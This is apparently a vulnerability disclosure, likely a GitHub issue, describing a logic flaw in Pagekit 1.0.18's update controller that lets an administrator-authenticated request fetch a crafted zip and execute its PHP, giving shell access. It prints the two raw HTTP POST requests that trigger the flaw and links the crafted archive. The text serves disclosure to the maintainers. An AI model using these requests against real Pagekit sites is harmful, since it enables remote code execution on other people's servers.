| Problem **There is a logical flaw that leads to obtaining shell access.** Technical Details  * Pagekit version: 1.0.18 * Webserver: nginx * Database: mysql * PHP Version: 7.4   Vulnerability Path: app/installer/src/Controller/UpdateController.php Lines 32-72: downloadAction and updateAction functions The downloadAction function retrieves a file from a remote location to the local system. The updateAction function reads the downloaded file. Within it, the SelfUpdater function is called at app/installer/src/SelfUpdater.php. It includes the app/installer/requirements.php file from the remotely fetched file. This can lead to remote code execution. Based on this, constructing a zip file as follows: [pagekit.zip](https://github.com/pagekit/pagekit/files/12388705/pagekit.zip)  The data package is as follows  ``` POST /index.php/admin/system/update/download HTTP/1.1 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: keep-alive Content-Length: 58 Content-Type: application/x-www-form-urlencoded Cookie: Administrator's Cookie Host: localhost Referer: http://localhost/index.php/admin/system/update/download User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36  url=constructed_zip_file&_csrf=4eb8d50f82ebae5b1fa16d5177d99ea7d740a8b2  ``` ``` POST /index.php/admin/system/update/update HTTP/1.1 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cache-Control: max-age=0 Connection: keep-alive Content-Length: 46 Content-Type: application/x-www-form-urlencoded Cookie: Administrator's Cookie Host: localhost Referer: http://localhost /index.php/admin/system/update/update User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36  _csrf=4eb8d50f82ebae5b1fa16d5177d99ea7d740a8b2  ``` |
